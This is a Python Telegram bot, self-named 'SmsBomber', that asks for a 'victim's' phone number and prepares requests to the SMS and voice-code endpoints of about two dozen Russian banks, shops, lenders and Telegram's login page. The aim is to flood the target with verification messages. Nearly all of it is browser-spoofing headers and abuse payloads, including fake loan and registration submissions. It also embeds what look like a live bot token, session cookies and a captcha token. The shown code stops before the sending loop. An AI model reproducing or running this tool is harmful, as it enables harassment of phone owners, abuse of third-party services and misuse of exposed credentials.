import requests
import threading
from fake_useragent import UserAgent as fake
from time import sleep
import telebot
from telebot import types
from bs4 import BeautifulSoup
from time import monotonic



global Flag
Flag = False
spam_markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
spam_markup.add(types.KeyboardButton("Начать Spam"))
start_sapm_markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
Token = '6127005090:AAFVpo9w-ji6TayuDfar3BOA6rP8BOygUQg'
bot = telebot.TeleBot(token=Token)



headers_pharmperm = {
    'authority': 'pharmperm.ru',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer': 'https://pharmperm.ru/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

headers_sokolov = {
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/vnd.api+json',
    'Origin': 'https://sokolov.ru',
    'Referer': 'https://sokolov.ru/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'X-Source': 'site',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

headers_riviera = {
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://riviera.su',
    'Referer': 'https://riviera.su/login',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'X-OCTOBER-REQUEST-FLASH': '1',
    'X-OCTOBER-REQUEST-HANDLER': 'PhoneVerify::onAjax',
    'X-OCTOBER-REQUEST-PARTIALS': '',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

headers_lunaro = {
    'authority': 'api.lunaro.ru',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'null',
    'content-type': 'application/json',
    'device-uuid': '26144dce-4743-476b-8e1b-dd122c0af223',
    'origin': 'https://lunaro.ru',
    'referer': 'https://lunaro.ru/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}

headers_chaika = {
    'authority': 'chaika.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://chaika.com',
    'referer': 'https://chaika.com/signup',
    'request-id': 'Sp644GyoqN4_',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-app': 'website',
    'x-lang': 'ru',
}

headers_evrasia = {
    'authority': 'evrasia.spb.ru',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://evrasia.spb.ru',
    'referer': 'https://evrasia.spb.ru/signup/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}

headers_zaymigo = {
    'authority': 'borrow.zaymigo.ru',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://borrow.zaymigo.ru',
    'referer': 'https://borrow.zaymigo.ru/?loanValue=4000&loanTerm=5',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}

headers_berkat = {
    'authority': 'berkat.ru',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://berkat.ru',
    'referer': 'https://berkat.ru/auth/register',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

headers_nadodeneg = {
    'authority': 'api.nadodeneg.ru',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://nadodeneg.ru',
    'referer': 'https://nadodeneg.ru/application/registration/phone',
    'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'x-frontend': 'prod-ru-nd-wp2_prod_develop',
}

headers_mtsbank = {
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    # 'Cookie': '__zzatmts-w-sso=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2UybmhRZHgVU0ARTXwuFhV/J1RMEA1ccz52dFo7aCFlSlogdhM/dRdZRkE2XBpLdWUvDDk6a2wkUlFDS2N8GgprLxoXCHAqUg0SYEREc3wlLTFmJ3xLKTUgGUNqTFVpQHA=j0zPiA==; _ym_uid=1695736758104787240; _ym_d=1695736758; tmr_lvid=78a4133aa493f5b19c55f56f32503908; tmr_lvidTS=1695736757756; _ym_isad=2; _ym_visorc=b; cfidsmts-w-sso=R+nsofuP+mZFNnrxAcH3QaFfarsx6u4zb73WflQoSSNNlQtEtiqyPcN2shMYaYwzP8bbN3QtEuwGk8rClOcqqBN39OyDnIR7fIxRKF3zNdhVcbd/BSlEWeY5YF0WXb6RAYpj79dO3jujBVyr4H6I9dGUanzlT1Wet5bY; gsscmts-w-sso=RfqhpOKyO9f6wLozSpKAEx/yHReVhC0INmexBMnxtg9cRpYLqGHdtPmEirJT4rFLWjAsKxJmHhZkYaq6Pv7m8B7txATXl+hEozXBn5jXo6Byxv9iZDeZqr0mCN4b2rb31K0WrHdVSTun6nF7stgct6p3edTKZBlcFWWoB36KeoT9lE5kmLtkuuMPrD2bvA3d0J2oZ8HMF9bonNEeQJUCr6SN3RguqN0EMJc1FB3fYhqHYo1+gxbKJ4ak3Kg1Ongh2jLCU1zi; go_session_id=ODA5YTU0ZTUtNTdmMS00NDMzLWFiZjUtMmU1YzQ1N2VhYzM1.d18a8fbf6a4adfddcac827076988b9bbf685f54d; fgsscmts-w-sso=qshEecc31ae73e7eaf429cd413e278b2dc3ebbe9; cfidsmtsb-w-payment-sso=0javmedAmXiWLb+UTOWLw4+70Op/6dZU9r3oIbd5gIIA9q2Oefj6txYFdKDPSyrqGG7XjI4hU5DhMVYGjpPpWH7O+9fD3rbU8avqGdl/c/9I/NsE3e/uSTWZ6ILnCYoreH4XSJPhq7kMoY745VhDjJQngpbdxn8b3ABm; cfidsmtsb-w-payment-sso=0javmedAmXiWLb+UTOWLw4+70Op/6dZU9r3oIbd5gIIA9q2Oefj6txYFdKDPSyrqGG7XjI4hU5DhMVYGjpPpWH7O+9fD3rbU8avqGdl/c/9I/NsE3e/uSTWZ6ILnCYoreH4XSJPhq7kMoY745VhDjJQngpbdxn8b3ABm; gsscmtsb-w-payment-sso=bZ+SOqmfMdfBcqUK0cmcUgLjYLWrqq56a8TONiMTWqzFrHV28I3Z1RTX2tSCOqoGu7YI7Mi4tb1cNcSHZc6xI5fvdcnYpWhEpsxLQ2UYsB7MYH+0evt6xmJH5an5wv/q2MN0PmDsfZNUoyd1KsiBwNYYra05N+HUrOn1V0Vx3G494sfJxJEmN9Z58Xur6cWTI0E8Ok3/1tRWFoQdGlEx2OVUTE9y8ChT9mI6ux4t/dWNR9tr/3fEP8sZZYYd/A==; gsscmtsb-w-payment-sso=bZ+SOqmfMdfBcqUK0cmcUgLjYLWrqq56a8TONiMTWqzFrHV28I3Z1RTX2tSCOqoGu7YI7Mi4tb1cNcSHZc6xI5fvdcnYpWhEpsxLQ2UYsB7MYH+0evt6xmJH5an5wv/q2MN0PmDsfZNUoyd1KsiBwNYYra05N+HUrOn1V0Vx3G494sfJxJEmN9Z58Xur6cWTI0E8Ok3/1tRWFoQdGlEx2OVUTE9y8ChT9mI6ux4t/dWNR9tr/3fEP8sZZYYd/A==; __zzatmtsb-w-payment-sso=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2UwQh5SGEdeUUBaCzQqFhV4b1hMDwxgQz50LjFDbE4behIieFY/dRdZRkE2XBpLdWUvDDk6a2wkUlFDS2N8GgprLxoXCHAqUg0SYkFDbXclLTFmJ3xLKTUgGUNqTFVpQB9BNjp3XFgOGVhefS5RUSwREQ4RRloLG2koIw0LCxdxRit8KnAfJGJ5WyBED04zW0wXNScrCgw+W3F2diwxbmYdUUNLX3gfGDpoXXsJXWYbRk0UdHZfbxt/JlocOWMgSV5SCCgfGH9wJlcJf00JEjUwG0VXVRgSGREYUT8wVDUwFgxBfikubC9LQGVvbCliHDljEQsnTjxCIhB8OUsYCQxfX0JuIzEMJWAkRgozdFVqfWtUVCdtHmxALiZTRRgjLHsfXQhucUZ9aE0IOTQ3QB1NZjsuFEVgfndjTBMgHw11OWl/fzdWIiQfLCRrMUMJcmYUd1xtFld6DCE1Yg8MCDhPTD1qQ2AQHntlfxR2cFQQVgxNWiFnUE46Jh5bRzdAWDoQc2dIdnpRPjBlGXEKW2EYCjROLTNBDldtOj4XXnU6dUtie1QgZF9Te2hSfyZWRHI9bGw7RhZZWgxASnhuYSYKKT0Sfn5BbBgsMQ1iYg5TI2FDPhFhTGROCRRrZEYOGyBlTSwRLjxpLB8eWFlzDWA6dkV9bXsma2pMOU9WRjYJSg0OLgsICQo+SnU1OSVHGDFfImBCKjoUFBJeDhgMb3RUFBBPNi1OIWV6OX11axptWVgzCzhPDlB7T2Q3Dj5/Iz5eCxVfZhUXIjIme3NdYwxJThwIDV99G34xXCl4GFQ1UT9FXlZGaXUkVRAQYkBHdHsuPm4fWzklaAsSPwsXTk8yNWwXS3UwEg==oDWwXg==; __zzatmtsb-w-payment-sso=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2UwQh5SGEdeUUBaCzQqFhV4b1hMDwxgQz50LjFDbE4behIieFY/dRdZRkE2XBpLdWUvDDk6a2wkUlFDS2N8GgprLxoXCHAqUg0SYkFDbXclLTFmJ3xLKTUgGUNqTFVpQB9BNjp3XFgOGVhefS5RUSwREQ4RRloLG2koIw0LCxdxRit8KnAfJGJ5WyBED04zW0wXNScrCgw+W3F2diwxbmYdUUNLX3gfGDpoXXsJXWYbRk0UdHZfbxt/JlocOWMgSV5SCCgfGH9wJlcJf00JEjUwG0VXVRgSGREYUT8wVDUwFgxBfikubC9LQGVvbCliHDljEQsnTjxCIhB8OUsYCQxfX0JuIzEMJWAkRgozdFVqfWtUVCdtHmxALiZTRRgjLHsfXQhucUZ9aE0IOTQ3QB1NZjsuFEVgfndjTBMgHw11OWl/fzdWIiQfLCRrMUMJcmYUd1xtFld6DCE1Yg8MCDhPTD1qQ2AQHntlfxR2cFQQVgxNWiFnUE46Jh5bRzdAWDoQc2dIdnpRPjBlGXEKW2EYCjROLTNBDldtOj4XXnU6dUtie1QgZF9Te2hSfyZWRHI9bGw7RhZZWgxASnhuYSYKKT0Sfn5BbBgsMQ1iYg5TI2FDPhFhTGROCRRrZEYOGyBlTSwRLjxpLB8eWFlzDWA6dkV9bXsma2pMOU9WRjYJSg0OLgsICQo+SnU1OSVHGDFfImBCKjoUFBJeDhgMb3RUFBBPNi1OIWV6OX11axptWVgzCzhPDlB7T2Q3Dj5/Iz5eCxVfZhUXIjIme3NdYwxJThwIDV99G34xXCl4GFQ1UT9FXlZGaXUkVRAQYkBHdHsuPm4fWzklaAsSPwsXTk8yNWwXS3UwEg==oDWwXg==; fgsscmtsb-w-payment-sso=xBEke1c74406a2304d669a85b7189de9a1f7ba4f; fgsscmtsb-w-payment-sso=xBEke1c74406a2304d669a85b7189de9a1f7ba4f',
    'Origin': 'https://sso.mtsbank.ru',
    'Referer': 'https://sso.mtsbank.ru/login/mtsmoney/auth/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'accept': '*/*',
    'content-type': 'application/json',
    'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'x-instana-l': '1,correlationType=web;correlationId=60bd766f3e55b17f',
    'x-instana-s': '60bd766f3e55b17f',
    'x-instana-t': '60bd766f3e55b17f',
}

headers_rshb = {
    'authority': 'retail.rshb.ru',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    # 'cookie': '_ym_uid=169581462390004598; _ym_d=1695814623; _ym_isad=2; _ym_visorc=b; SESSION=OGQxZDlkMjUtZWJkMi00YWU4LWJjZTctNzVlNTAxMWVhYTk2; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; mindboxDeviceUUID=26144dce-4743-476b-8e1b-dd122c0af223; directCrm-session=%7B%22deviceGuid%22%3A%2226144dce-4743-476b-8e1b-dd122c0af223%22%7D',
    'origin': 'https://retail.rshb.ru',
    'referer': 'https://retail.rshb.ru/debit_card_lead?utm_start_app=true',
    'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'x-b3-sampled': '1',
    'x-b3-spanid': '872ceb8571dde260',
    'x-b3-traceid': '872ceb8571dde260',
}

headers_okunay = {
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryaPrnDpO48mQNUBoX',
    # 'Cookie': '_ym_uid=1698484868679935137; _ym_d=1698484868; _ym_isad=2; _ym_visorc=w',
    'Origin': 'https://okunay.ru',
    'Referer': 'https://okunay.ru/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

@bot.message_handler(commands=['start'])
def start_func(message):
    bot.send_message(message.chat.id, 'Привет, это SmsBomber !', parse_mode='Markdown', reply_markup=spam_markup)

@bot.message_handler(commands=['stop'])
def stop_func(message):
    global Flag
    Flag = False
    bot.send_message(message.chat.id, 'Привет, Spam окончен !', parse_mode='Markdown', reply_markup=spam_markup)

@bot.message_handler(content_types=['text'])
def check_text(message):
    if message.text == 'Начать Spam':
        if Flag == True:
            bot.send_message(message.chat.id, "Спамер уже запущен другим пользователем,\nПопробуйте чуть позже !")
        else:
            msg = bot.send_message(message.chat.id, 'Введите номер жертвы в формате 7**********')
            bot.register_next_step_handler(msg, start_spam)


user = fake().random
headers = {'user_agent' : user}

headers_beeline = {
    'Accept': 'application/json',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-type': 'application/json',
    'Origin': 'https://beeline.tv',
    'Referer': 'https://beeline.tv/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': user,
    'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}


def correct_number(number):
    num1 = '+7 000 111 2222'
    num1 = num1.replace('000', number[1:4])  
    num1 = num1.replace('111', number[4:7])
    num1 = num1.replace('2222', number[7:11])
    # +7 906 488 7738

    num2 = '+11111111111'
    num2 = num2.replace('11111111111', number[0:11])
    # +79064887738

    num3 = '+7 (000) 111-22-33'
    num3 = num3.replace('000', number[1:4])  
    num3 = num3.replace('111', number[4:7])
    num3 = num3.replace('22', number[7:9])
    num3 = num3.replace('33', number[9:11])
    # +7 (906) 488-77-38

    num4=number
    # 79064887738

    num5 = '+7 000 111 22 33'
    num5 = num5.replace('000', number[1:4])  
    num5 = num5.replace('111', number[4:7])
    num5 = num5.replace('22', number[7:9])
    num5 = num5.replace('33', number[9:11])
    # +7 906 488 77 38

    num6 = num3[:2] + num3[3:]
    # +7(906) 488-77-38

    num7 = num4[:0] + num4[1:]
    # 9064887738

    num8 = num3.replace(")", '')
    num8 = num8.replace("(", '')

    num9 = '8(111)222-33-44'
    num9 = num9.replace("111", number[1:4])
    num9 = num9.replace("222", number[4:7])
    num9 = num9.replace("33", number[7:9])
    num9 = num9.replace("33", number[9:11])
    # 8(906)488-77-38
    

    return num1, num2, num3, num4, num5, num6, num7, num8, num9

def data_links(number):
    num1, num2, num3, num4, num5, num6, num7, num8, num9 = correct_number(number)
    link1 = 'https://www.salonhifi.ru/auths.php'
    data1 = {'phonef' : str(num1),
            'agree' : 'on'}

    link2 = 'https://okunay.ru/ajax'
    params2 = {
    'method': 'auth.login_voice',
    }

    data2= '------WebKitFormBoundaryaPrnDpO48mQNUBoX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+7 (906) 488-77-38\r\n------WebKitFormBoundaryaPrnDpO48mQNUBoX--\r\n'


    link4 = 'https://api.sushifox.ru/web/auth/sendCode?client_device_type=web&uuid=6FmnD4_IzI_im6hWkowPp'
    data4 = {'phone' : str(num4)}

    link5 = 'https://hoff.ru/vue/register/'
    data5 = {'phone' : str(num5)} # задержка минута (вроде)

    link6 = 'https://armed.ru/personal/ajax.php' # armed.ru
    data6 = {'method' : "checkphone_auth",
            'phone' : str(num3),
    }

    link7 = 'https://pk.mfua.ru/ajax/forgot'
    data7 = {'auth' : 'true', 'main_phone' : str(num6)}

    link8 = 'https://3boga.ru/lk/sendsms.php'
    data8 = {
        'login' : str(num7),
        '...word' : '12345678D',
        'kodconfirmation' : '',
        'id' : '0'
            } 

    
    link10 = 'https://my.telegram.org/auth/send_password' # telegram_spam
    data10 = {'phone' : str(num2)}

    

    link12 = f"https://almaty.instashop.kz/auth/?page=register&ajax=Y&country=7&phone={str(num7)}&is_ajax_request=Y&backurl=https://instashop.kz/store/galmart/"

    link13 = "https://pharmperm.ru/external_api/api.php"
    data13 = {
    'module': 'users',
    'method': 'register_user',
    'phone': str(num8),
    '...word': '38610',
}

    link14 = 'https://sokolov.ru/api/v4/profile/user/send-code/'
    data14 = '{"data":{"type":"login","attributes":{"phone":""}}}'
    

    link15 = "https://api.mkb-broker.ru/api/auth/login/new"
    data15 = {
        'login': str(num4),
        'doc_297413': True,
        'doc_203448': True,
        'doc_203449': False,
        'queryParams': {},
        'appName': 'mkb-invest.web',
        'deviceId': '-',
        'deviceInfo': fake,
    }

    link16 = 'https://api.lunaro.ru/api/query'
    data16 = {
        'operationName': 'sendCode',
        'variables': {
            'phone': str(num2),
            'utm': None,
            'reCaptcha': '03ADUVZwBB8ZHKa1A894tZ-8pMlSJFOW4M_4sTd8EwLMmh3oU7b2F4fxkEXJ5zINCDzmw1LyePXVatWKarOpuR5S3sTZldAt-KLbidinmIF_73I5-Eaf5AVwhC_X3zYiaKfU371mmExw7VDKh4AEsA4mQ7hsFhd4Y3QsFJqjwrrVhNru8eV2xLQIlU5ZxiRTYO9upTWOskeiwKGYZOdB_ZeJKShNKBzz8EeAt-ZHQ7hTKBnCeS5gI_w5w6gHe3yDTAQb-aaWWui0QFjjiJZ0O8WTo1qqCcGNTublYxjljt5ig-qf2wkoygjmGPrE26KTk_X8OFpKoGUHrAlUCVwZpps7z2osY31eQ3de8491gLBVXwUZc_ufbw6qgZuxUaUtzXLPKI-nqSgFrvsLDx4hY7OZHLkm7uJfdisWDR8pnXrsKFjc3kLmVv4OD5gufZ0hwytsFHK5NmwBgathgd0M_h3dU6CpHDm2MJtZ4mLEX-dywllLBGe6fnWxpthe8UuLR62wOEzZI2mfgHnX2NOKrhBfJWhXGr_5y9Q8kRNI4U25PMwjrjYI-l9_9Q1LqaYUKw_qZxKItAybXdsR4PZO4c6ObZdoPsdNn1J32Jw8vkYwML1WocIoqdCnahXtxFJ6BLIxY7iOBw_zkMPbFz8yNbsymzQJo_NFMBBQqH-DElzL4Tdd_IWRF9QQ9uGCX5prhWQwr30ov1sdL2exBDbNbBHoD4ZUe_-lgI0imZlUTk2HpJVmcgg06ds4RvdDSDIJ9Zd_HxvC4LhannP77Nj4D2uuRM9W1HxL7OJYihNILAX9Rnekcd0mzR7eNTJ9-plomGI5ZfpUvXq2ZqZLPfYDf6lApPQIKN-WbgX7q3UQtkwxVHj74n5q61UJfA4zcyEkSpUsxril9z1PwdczO0qDwwwJaO_MiWeKX2EooF8lOYp5ieig9i30nFZx2BOXcvNbhe9h9J4RIgldgIyDWUEocJuPjiHdB-EAEOgO5AxESGMHXC25gZwv3K6l_wDbI2bcQtFWr0lDGufOWWHN2ASrqPQTBqjmDToGfdPQICdiHsGrk6ZmnvsUYlftw_cwK2wHqGmObGUIffZK4WRn8CAEmFp67jjgvSIrLHOOq5F66KRVIb5nCZIrM4Q5_vki-uGn3EkqRbDMHgsjLubZLu3GNDF3CehRqh1hqef77karUOOo0vlz5HAoi3Ey9lXUIw0W0CLS7iYc4oPXPYUN7LNnNUDGQMXrA0jvmQ18RLDCvBnbObqnZ3RXt-3L2Jv7DMb1zxws1Ir0NQNDR7N8QZ_qiFuSi5sCo0Pk3u9mO3XSwOis6aHvW4Bj-W5Ne-Nme11-uiQ1wKbS60WAgEnqn_jyGZsprgzbpBoTWh9-jP6B3eBXjyYiWDcYuyJwK8mll6bxuRHwL2LDhzPWesw9OyZtl_e8dNeLHmPncE2aRsjE0ajQJ06wLFslXx54t7N0WXHsbhZkmpGpe-JZFDd0TH0heJymNVMRf_NTnMBg',
            'referer': 'https://www.google.com/',
        },
    'query': 'mutation sendCode($email: String, $phone: String, $utm: String, $reCaptcha: String, $referer: String) {\n  sendCode(\n    input: {email: $email, phone: $phone, utm: $utm, reCaptcha: $reCaptcha, referer: $referer}\n  )\n}\n',
    }

    link17 = 'https://riviera.su/login'
    data17 = f'phone={str(num9)}'

    json_data111 = {
                'email': None,
                'lastName': 'sd',
                'firstName': 'sd',
                'patronymic': 'sd',
                'birthday': '2005-10-12',
                'phone': str(num2),
                'sex': 'male',
            }

    link18 = 'https://evrasia.spb.ru/signup/'
    data18 = {
    'name': 'as',
    'username': str(num3),
    'mail': 'a12@mail.ru',
    'bday': '12/12/2000',
    'PERSONAL_GENDER': 'M',
    'pers_data': 'yes',
    }

    link19 = 'https://borrow.zaymigo.ru/rpc/v1'
    data19 = {
        'jsonrpc': '2.0',
        'id': '497f157f-eae9-4ed8-992b-3dd520d16442',
        'method': 'create',
        'params': {
            'borrower': {
                'surname': 'Аа',
                'name': 'Аа',
                'patronymic': 'Аа',
                'patronymicNotExists': False,
                'phone': num2,
                'email': 'kd@mail.ru',
                'phoneParams': [],
            },
            'term': 5,
            'amount': 4000,
            'agreements': [
                {
                    'name': 'assignment_of_claims',
                    'val': False,
                },
                {
                    'name': 'consent_obligations_borrower',
                    'val': True,
                },
            ],
            'marketingFields': {
                'calc': 'v2',
            },
            'promoCode': 'zaimpromonol',
        },
    }

    number_call = str(num7)
    link20 = 'https://api.nadodeneg.ru/user'
    data20 = {
        'mobile_phone': str(number),
        'step': 'Step1',
        'target_url': 'https://nadodeneg.ru/?utm_source=c2m&utm_medium=affiliate&utm_campaign=c2m_cps&utm_term=174&click_id=td39yiw9w71dudeeeqv6x35gubajc95x&ndl',
        'requested_amount': 10000,
        'requested_days': 7,
        'ga_cid': '1241153200.1694970851',
    }

    link21 = "https://pk.mfua.ru/ajax/registration"
    data21 = {'uname' : 'as',
            'main_phone' : str(num6),
            'pers_data' : 'on'}
    
    link22 = 'https://rest.beeline.tv/api_v3/service/ottUser/action/login'
    data22 = {
        'apiVersion': '5.4',
        'ks': 'djJ8NDc4fH0a7eecoxlPXHkEQDH0AAei7RqSsNYZtOmvHEnSU9jbzI9fMRPkkgT8vTlJt88jLUaoCjZASqm2S-u-yxVpjukjgI-l93_1MTCQe5CRldP-4GKcOPHWU8k6-DQXuQmwGKphpzGxwsjWTNz7CqyJPxjZD039_eJojT2ImG7uKO_qsqSPenzRmqRScXNPlX0KwqWcT3J5UdmQErGi6W5zLFmgniUiZm3L52i9VAz8o5Yy4eZ0D5YUi-YcdSowvorqlDC-5gB_4j-5uP12MreelxWq2QafJQ26OJvOUzxPvQjQK66urA8Ot6IfFHXq63czUS5AeHr0JiWPUikJg5J_iCulfDP1AeBQhwPaGUridG_8',
        'username': str(num4),
        'password': '123456',
        'udid': 'EEE279C7EFEC2561',
        'partnerId': '478',
        'extraParams': {
            'devicedetails': {
                'value': '{"tveversion":"12.8.1","family":"pcmac","manufacturer":"Windows 10","model":"Chrome 117 (117.0.0.0)","osversion":null,"serialnumber":null}',
                'objectType': 'KalturaStringValue',
            },
            'loginType': {
                'value': 'singleLogin',
                'objectType': 'KalturaStringValue',
            },
            'brandID': {
                'value': '22',
                'objectType': 'KalturaStringValue',
            },
        },
    }

    link23 = 'https://sso.mtsbank.ru/api/v2/login'
    data23 = {
        'login': str(num4),
    }

    link24 = 'https://retail.rshb.ru/light-api-cash/v1/sms/sendCode'
    data24 = {
        'phoneNumber': str(num2),
        'smsCodesSetName': {
            'key': 'AUTHENTICATION',
        },
    }

